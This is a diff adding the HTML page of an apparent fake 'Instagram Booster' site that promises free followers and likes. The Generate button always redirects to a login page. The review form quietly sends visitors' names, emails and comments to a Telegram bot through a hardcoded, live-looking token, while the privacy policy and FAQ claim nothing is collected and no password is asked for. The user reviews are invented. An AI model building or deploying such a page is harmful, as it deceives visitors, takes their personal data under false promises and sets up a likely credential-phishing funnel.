@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Booster</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+
+        :root {
+            --primary-color: #ff386e;
+            --secondary-color: #c1154c;
+            --bg-color: #fff;
+            --text-color: #262626;
+            --text-color-light: #777;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(to right, #ffffff, #fff0f5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            position: relative;
+            opacity: 0;
+            transition: opacity 1.5s ease-in;
+        }
+
+        body.loaded {
+            opacity: 1;
+        }
+
+        .menu-button {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1001;
+            background: transparent;
+            color: var(--text-color);
+            border: 2px solid var(--text-color-light);
+            padding: 8px 12px;
+            border-radius: 8px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .menu-button:hover {
+            background-color: #eee;
+        }
+
+        .side-menu {
+            position: fixed;
+            top: 0;
+            right: -300px;
+            width: 250px;
+            height: 100%;
+            background: #fff;
+            box-shadow: -2px 0 10px rgba(0, 0, 0, 0.1);
+            padding-top: 60px;
+            transition: right 0.3s ease-in-out;
+            z-index: 1000;
+        }
+        .side-menu.open {
+            right: 0;
+        }
+        .side-menu ul {
+            list-style: none;
+            padding: 0;
+        }
+        .side-menu li a {
+            display: block;
+            padding: 15px 20px;
+            color: var(--text-color);
+            text-decoration: none;
+            border-bottom: 1px solid #eee;
+            transition: background-color 0.2s;
+            font-size: 1.1rem;
+        }
+        .side-menu li a:hover {
+            background-color: #f7f7f7;
+            color: var(--primary-color);
+        }
+        .side-menu .login-btn {
+            background: var(--primary-color);
+            color: #fff;
+            text-align: center;
+            margin: 20px;
+            border-radius: 8px;
+            transition: transform 0.2s;
+        }
+        .side-menu .login-btn:hover {
+            transform: scale(1.05);
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+        .overlay.active {
+            display: block;
+        }
+
+        .container, .reviews-section, .comment-form-section, .faq-section, .about-section {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 100%;
+            max-width: 550px;
+            margin-bottom: 30px;
+        }
+        .icon-container {
+            margin-bottom: 25px;
+            height: 80px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .dynamic-icon {
+            font-size: 4rem;
+            color: var(--primary-color);
+            animation: fadeInOut 1s infinite alternate;
+        }
+        h2, h3 {
+            color: var(--text-color);
+            margin-bottom: 15px;
+            font-size: 2.2rem;
+            font-weight: 700;
+        }
+        p {
+            color: var(--text-color-light);
+            font-size: 1rem;
+            margin-bottom: 30px;
+        }
+        .input-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 700;
+            color: var(--text-color);
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 1rem;
+            transition: border-color 0.3s;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: var(--primary-color);
+        }
+        .options {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            margin-bottom: 25px;
+        }
+        .option-box {
+            background-color: #f7f7f7;
+            padding: 20px;
+            border: 2px solid #eee;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 48%;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+        .option-box.selected {
+            border-color: var(--primary-color);
+            background-color: #fce4ec;
+        }
+        .option-box i {
+            font-size: 2.5rem;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+        .option-box h4 {
+            margin: 0;
+            color: var(--text-color);
+            font-weight: 600;
+        }
+        .option-box .pro-tag {
+            position: absolute;
+            top: -10px;
+            right: -10px;
+            background-color: gold;
+            color: #333;
+            font-size: 0.7rem;
+            font-weight: bold;
+            padding: 4px 8px;
+            border-radius: 5px;
+        }
+        .btn {
+            background: linear-gradient(to right, #ff386e, #ff84a8);
+            color: #fff;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(255, 56, 110, 0.4);
+        }
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        .result-message {
+            margin-top: 30px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            display: none;
+        }
+        .loading-animation {
+            margin-top: 30px;
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+        .progress-bar-container {
+            width: 100%;
+            background-color: #e0e0e0;
+            border-radius: 10px;
+            overflow: hidden;
+            height: 25px;
+            margin-bottom: 15px;
+        }
+        .progress-bar {
+            width: 0;
+            height: 100%;
+            background: linear-gradient(to right, #ff386e, #ff84a8);
+            animation: progress 3s forwards;
+        }
+        .loading-text {
+            color: #555;
+            font-style: italic;
+        }
+        .like-effect {
+            position: fixed;
+            font-size: 3rem;
+            color: #ff386e;
+            animation: likePop 1s ease-out forwards;
+            pointer-events: none;
+            z-index: 10;
+            opacity: 0;
+        }
+        .reviews-section, .comment-form-section, .faq-section, .about-section {
+            margin-top: 30px;
+            text-align: left;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+        }
+        .reviews-section h3, .comment-form-section h3, .faq-section h3, .about-section h3 {
+            font-size: 1.8rem;
+            color: var(--text-color);
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .review {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 15px;
+        }
+        .review:last-child {
+            border-bottom: none;
+        }
+        .review-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            margin-right: 15px;
+            flex-shrink: 0;
+            object-fit: cover;
+        }
+        .review-content {
+            flex-grow: 1;
+        }
+        .review-content h4 {
+            margin: 0;
+            color: var(--text-color);
+            font-size: 1rem;
+        }
+        .review-content .rating {
+            color: #ffc107;
+            font-size: 0.9rem;
+            margin-bottom: 5px;
+        }
+        .review-content p {
+            margin: 0;
+            color: var(--text-color-light);
+            font-size: 0.9rem;
+            line-height: 1.4;
+        }
+        .comment-form-section .btn {
+            margin-top: 15px;
+        }
+        .faq-item {
+            text-align: left;
+            margin-bottom: 15px;
+        }
+        .faq-item h4 {
+            color: var(--text-color);
+            cursor: pointer;
+            position: relative;
+            padding-right: 25px;
+            margin: 0;
+        }
+        .faq-item h4:after {
+            content: '+';
+            position: absolute;
+            right: 0;
+            font-size: 1.2rem;
+            font-weight: bold;
+            transition: transform 0.3s;
+        }
+        .faq-item.active h4:after {
+            transform: rotate(45deg);
+        }
+        .faq-item p {
+            display: none;
+            margin-top: 10px;
+            padding-left: 15px;
+            border-left: 3px solid var(--primary-color);
+        }
+        .faq-item.active p {
+            display: block;
+        }
+        footer {
+            margin-top: 40px;
+            padding: 20px;
+            text-align: center;
+            color: #777;
+            font-size: 0.9rem;
+            opacity: 0.8;
+            width: 100%;
+        }
+        footer .heart-icon {
+            color: red;
+        }
+        .footer-links a {
+            color: var(--text-color-light);
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        @keyframes fadeInOut {
+            0%, 100% { opacity: 0; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1); }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        @keyframes likePop {
+            0% {
+                transform: scale(0.5);
+                opacity: 0;
+            }
+            50% {
+                transform: scale(1.5);
+                opacity: 1;
+            }
+            100% {
+                transform: scale(0.8);
+                opacity: 0;
+            }
+        }
+        
+        .popup-page {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.25);
+            z-index: 1002;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+        }
+        .popup-page h3 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+        }
+        .popup-page p {
+            margin-bottom: 20px;
+        }
+        .popup-page a {
+            background: var(--primary-color);
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 8px;
+            text-decoration: none;
+        }
+
+        .review-success-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.25);
+            z-index: 1002;
+            width: 90%;
+            max-width: 300px;
+            text-align: center;
+            display: none;
+        }
+
+        .review-success-popup .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #aaa;
+            transition: color 0.2s;
+        }
+
+        .review-success-popup .close-btn:hover {
+            color: var(--text-color);
+        }
+
+        .review-success-popup h3 {
+            color: #4CAF50; /* Green for success */
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+        }
+
+        .review-success-popup p {
+            font-size: 0.9rem;
+            color: var(--text-color);
+            margin-bottom: 15px;
+        }
+
+        .review-success-popup .success-icon {
+            font-size: 2.5rem;
+            color: #4CAF50;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<button class="menu-button" onclick="toggleMenu()">
+    <i class="fas fa-ellipsis-v"></i>
+</button>
+
+<div class="side-menu" id="sideMenu">
+    <ul>
+        <li><a href="#free-service" onclick="toggleMenu()"><i class="fas fa-gift"></i> Free Service</a></li>
+        <li><a href="#about" onclick="toggleMenu()"><i class="fas fa-info-circle"></i> About Us</a></li>
+        <li><a href="#reviews" onclick="toggleMenu()"><i class="fas fa-comments"></i> Reviews</a></li>
+        <li><a href="#faq" onclick="toggleMenu()"><i class="fas fa-question-circle"></i> FAQ</a></li>
+        <li><a href="login.html" class="login-btn">Login / Sign Up</a></li>
+    </ul>
+</div>
+
+<div class="overlay" id="overlay" onclick="hideAllPopups()"></div>
+
+<div class="container" id="free-service">
+    <div class="icon-container">
+        <i id="dynamicIcon" class="dynamic-icon fab fa-instagram"></i>
+    </div>
+    <h2>Instagram Booster</h2>
+    <p>Generate free followers and likes for your Instagram account!</p>
+
+    <div class="input-group">
+        <label for="username">Instagram Username</label>
+        <input type="text" id="username" class="input-field" placeholder="@username" required>
+    </div>
+    
+    <div class="options">
+        <div class="option-box" onclick="selectOption('followers')">
+            <i class="fas fa-users"></i>
+            <h4>Followers</h4>
+        </div>
+        <div class="option-box" onclick="selectOption('likes')">
+            <i class="fas fa-heart"></i>
+            <h4>Likes</h4>
+        </div>
+    </div>
+    
+    <div class="input-group" id="quantity-group" style="display: none;">
+        <label for="quantity">Quantity</label>
+        <select id="quantity" class="input-field" onchange="updateButtonText()">
+            <option value="500">500 (Free)</option>
+            <option value="1000">1000 (Pro)</option>
+            <option value="5000">5000 (Pro)</option>
+            <option value="10000">10000 (Pro)</option>
+        </select>
+    </div>
+    
+    <button class="btn" onclick="generate()" id="generateButton">Generate Now</button>
+    
+    <div class="loading-animation" id="loadingAnimation">
+        <div class="progress-bar-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <p class="loading-text" id="loadingText">Connecting to Instagram servers...</p>
+    </div>
+    
+    <p class="result-message" id="resultMessage"></p>
+</div>
+
+<div class="about-section" id="about">
+    <h3>About Us</h3>
+    <p>At InstaBoost, our mission is to empower social media enthusiasts with tools to grow their online presence. Founded in 2024 by a team of social media experts, our platform simulates the generation of followers and likes to provide an entertaining and engaging experience for users.</p>
+</div>
+
+<div class="reviews-section" id="reviews">
+    <h3>User Reviews</h3>
+    
+    <div class="review">
+        <img src="https://i.pravatar.cc/50?u=a" alt="Aniket Sharma" class="review-avatar">
+        <div class="review-content">
+            <h4>Aniket Sharma</h4>
+            <div class="rating">
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+            </div>
+            <p>वाह! मैंने कभी नहीं सोचा था कि यह इतना आसान होगा। 5000 फॉलोअर्स 3 मिनट में मिल गए! यह वेबसाइट कमाल है!</p>
+        </div>
+    </div>
+    
+    <div class="review">
+        <img src="https://i.pravatar.cc/50?u=p" alt="Priya Singh" class="review-avatar">
+        <div class="review-content">
+            <h4>Priya Singh</h4>
+            <div class="rating">
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star-half-alt"></i>
+            </div>
+            <p>I got 10,000 likes on my photo. This website feels so real. Thank you so much!</p>
+        </div>
+    </div>
+    
+    <div class="review">
+        <img src="https://i.pravatar.cc/50?u=r" alt="Rohan Kumar" class="review-avatar">
+        <div class="review-content">
+            <h4>Rohan Kumar</h4>
+            <div class="rating">
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star-half-alt"></i>
+            </div>
+            <p>Ekdum badhiya! Main apne doston ko bhi yahi website suggest karunga. Iska use karna bahut aasan hai।</p>
+        </div>
+    </div>
+    
+    <div class="review">
+        <img src="https://i.pravatar.cc/50?u=n" alt="Neha Verma" class="review-avatar">
+        <div class="review-content">
+            <h4>Neha Verma</h4>
+            <div class="rating">
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+            </div>
+            <p>Yeh website sach mein kaam karti hai! Mujhe meri reels par laakhon views mile. Yeh meri ummeed se kahin zyada achha hai!</p>
+        </div>
+    </div>
+
+    <div class="review">
+        <img src="https://i.pravatar.cc/50?u=v" alt="Vikram Rao" class="review-avatar">
+        <div class="review-content">
+            <h4>Vikram Rao</h4>
+            <div class="rating">
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star-half-alt"></i>
+            </div>
+            <p>I generated 1000 followers and it was so much fun. Thank you for this kind of tool!</p>
+        </div>
+    </div>
+</div>
+
+<div class="comment-form-section">
+    <h3>Leave a Review</h3>
+    <form id="commentForm">
+        <div class="input-group">
+            <label for="commentName">Name</label>
+            <input type="text" id="commentName" class="input-field" placeholder="Your Name" required>
+        </div>
+        <div class="input-group">
+            <label for="commentEmail">Email ID</label>
+            <input type="email" id="commentEmail" class="input-field" placeholder="Your Email" required>
+        </div>
+        <div class="input-group">
+            <label for="commentText">Comment</label>
+            <textarea id="commentText" class="input-field" rows="4" placeholder="Write your review here..." required></textarea>
+        </div>
+        <button type="submit" class="btn">Submit Review</button>
+    </form>
+</div>
+
+<div class="faq-section" id="faq">
+    <div style="height: 30px;"></div>
+    <h3>Frequently Asked Questions</h3>
+    <div class="faq-item">
+        <h4 onclick="toggleFAQ(this)">Is this website safe to use?</h4>
+        <p>Yes, this website is completely safe. We do not ask for your password or any sensitive information. It's a fun and harmless tool.</p>
+    </div>
+    <div class="faq-item">
+        <h4 onclick="toggleFAQ(this)">How long does it take to get followers/likes?</h4>
+        <p>Our booster tool simulates the process in just a few seconds. The results are instant (but fake, for fun!).</p>
+    </div>
+    <div class="faq-item">
+        <h4 onclick="toggleFAQ(this)">Do I need to pay for this service?</h4>
+        <p>No, our service is completely free! You can generate followers and likes as many times as you like without any cost.</p>
+    </div>
+    <div class="faq-item">
+        <h4 onclick="toggleFAQ(this)">Will this get my Instagram account banned?</h4>
+        <p>No, absolutely not. Since this is a fake tool for entertainment purposes, there is no risk to your Instagram account.</p>
+    </div>
+</div>
+
+<div class="popup-page" id="terms-page" style="display:none;">
+    <h3>Terms of Service</h3>
+    <p>This is a demonstration page. The service offered on this website is for entertainment purposes only and does not provide real Instagram followers or likes. By using this website, you agree to these terms.</p>
+    <a href="#" onclick="hideAllPopups()">Close</a>
+</div>
+
+<div class="popup-page" id="privacy-page" style="display:none;">
+    <h3>Privacy Policy</h3>
+    <p>This is a demonstration page. We do not collect or store any personal information from you. Any data entered is not saved or used for any purpose. This policy is for informational purposes only.</p>
+    <a href="#" onclick="hideAllPopups()">Close</a>
+</div>
+
+<div class="review-success-popup" id="reviewSuccessPopup">
+    <i class="fas fa-times close-btn" onclick="hideAllPopups()"></i>
+    <div class="review-success-content">
+        <i class="fas fa-check-circle success-icon"></i>
+        <h3>Thank you for your valuable feedback!</h3>
+        <p>Your review is sent successfully. We regularly check and act on all reviews to improve our services.</p>
+        <button class="btn" onclick="hideAllPopups()">Okay</button>
+    </div>
+</div>
+
+<footer>
+    <div class="footer-links">
+        <a href="#about">About Us</a> |
+        <a href="#" onclick="showPopup('terms-page')">Terms of Service</a> |
+        <a href="#" onclick="showPopup('privacy-page')">Privacy Policy</a>
+    </div>
+    <div style="margin-top: 10px;">
+        © 2025 URL Shortener | Developed with <span style="color: red;">♥</span> by Divyansh - Deewana
+    </div>
+</footer>
+
+<script>
+    // --- Telegram Bot Integration ---
+    const TELEGRAM_BOT_TOKEN = '8106988001:AAFaoV6ya8Rq7Y_015YNr_QZf17Hj1IJwmA'; // Replace with your bot token
+    const TELEGRAM_CHAT_ID = '2031314339';     // Replace with your chat ID
+
+    async function sendToTelegram(message) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+            console.error('Telegram bot token or chat ID is not configured.');
+            return;
+        }
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const params = new URLSearchParams({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        });
+
+        try {
+            await fetch(`${url}?${params.toString()}`);
+            console.log('Message sent to Telegram successfully!');
+        } catch (error) {
+            console.error('Failed to send message to Telegram:', error);
+        }
+    }
+
+    window.addEventListener('load', () => {
+        document.body.classList.add('loaded');
+    });
+
+    let selectedOption = '';
+    const icons = ['fab fa-instagram', 'fas fa-heart', 'fas fa-users'];
+    let currentIconIndex = 0;
+    const dynamicIconElement = document.getElementById('dynamicIcon');
+    const sideMenu = document.getElementById('sideMenu');
+    const overlay = document.getElementById('overlay');
+    const generateButton = document.getElementById('generateButton');
+    const reviewSuccessPopup = document.getElementById('reviewSuccessPopup');
+    const popupPages = document.querySelectorAll('.popup-page');
+
+    setInterval(() => {
+        dynamicIconElement.className = `dynamic-icon ${icons[currentIconIndex]}`;
+        currentIconIndex = (currentIconIndex + 1) % icons.length;
+    }, 1000);
+
+    function toggleMenu() {
+        sideMenu.classList.toggle('open');
+        overlay.classList.toggle('active');
+    }
+
+    function selectOption(option) {
+        selectedOption = option;
+        const optionBoxes = document.querySelectorAll('.option-box');
+        optionBoxes.forEach(box => box.classList.remove('selected'));
+        document.querySelector(`.option-box[onclick*="${option}"]`).classList.add('selected');
+        document.getElementById('quantity-group').style.display = 'block';
+
+        updateButtonText();
+    }
+
+    function updateButtonText() {
+        if (selectedOption === 'followers') {
+            generateButton.innerText = `Get Followers`;
+        } else if (selectedOption === 'likes') {
+            generateButton.innerText = `Get Likes`;
+        }
+    }
+
+    function generate() {
+        const username = document.getElementById('username').value;
+        
+        if (!username || !selectedOption) {
+            alert('Please enter a username and select an option.');
+            return;
+        }
+        
+        // Redirect to the login page regardless of the option
+        window.location.href = 'login.html';
+    }
+
+    function toggleFAQ(element) {
+        const parent = element.parentElement;
+        parent.classList.toggle('active');
+    }
+
+    function showPopup(id) {
+        hideAllPopups();
+        document.getElementById(id).style.display = 'block';
+        overlay.classList.add('active');
+    }
+
+    function hideAllPopups() {
+        reviewSuccessPopup.style.display = 'none';
+        popupPages.forEach(popup => popup.style.display = 'none');
+        overlay.classList.remove('active');
+        if (sideMenu.classList.contains('open')) {
+            sideMenu.classList.remove('open');
+        }
+    }
+
+    document.getElementById('commentForm').addEventListener('submit', async function(event) {
+        event.preventDefault();
+        
+        const name = document.getElementById('commentName').value;
+        const email = document.getElementById('commentEmail').value;
+        const comment = document.getElementById('commentText').value;
+
+        if (name && email && comment) {
+            const telegramMessage = `<b>New Comment Received!</b>\n\n<b>Name:</b> ${name}\n<b>Email:</b> ${email}\n<b>Comment:</b> ${comment}`;
+            await sendToTelegram(telegramMessage);
+            
+            showPopup('reviewSuccessPopup');
+            
+            this.reset();
+        } else {
+            alert('Please fill out all the fields.');
+        }
+    });
+</script>
+</body>
+</html>
